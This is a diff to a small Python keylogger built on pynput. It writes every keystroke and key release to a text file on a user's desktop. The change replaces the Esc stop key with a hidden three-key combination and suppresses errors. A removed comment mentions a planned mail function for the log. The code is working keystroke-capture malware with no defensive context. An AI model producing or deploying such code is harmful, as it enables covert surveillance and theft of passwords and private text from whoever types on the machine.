@@ -1,26 +1,40 @@
 from pynput import keyboard
 
+# creating a new file named keys
 keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "w")
+
+close_combination = {keyboard.Key.ctrl_r,
+                     keyboard.Key.shift_l, keyboard.Key.alt_l}
+current = set()
 
 
 def on_press(key):
-    try:
-        keys.write('alphanumeric key {0} pressed\n'.format(
-            key.char))
-    except AttributeError:
-        keys.write('special key {0} pressed\n'.format(
-            key))
+
+    if key in close_combination:
+        current.add(key)
+        if all(k in current for k in close_combination):
+
+            keys.close()
+            listener.stop()
+    else:
+        try:
+            keys.write('alphanumeric key {0} pressed\n'.format(
+                key.char))
+        except AttributeError:
+            keys.write('special key {0} pressed\n'.format(
+                key))
 
 
 def on_release(key):
-    keys.write('{0} released\n'.format(
-        key))
-
-    if key == keyboard.Key.esc:
-        keys.close()
-        # here we call the mail function
-        # Stop listener
-        return False
+    try:
+        current.remove(key)
+    except KeyError:
+        pass
+    try:
+        keys.write('{0} released\n'.format(
+            key))
+    except:
+        pass
 
 
 # Collect events until released
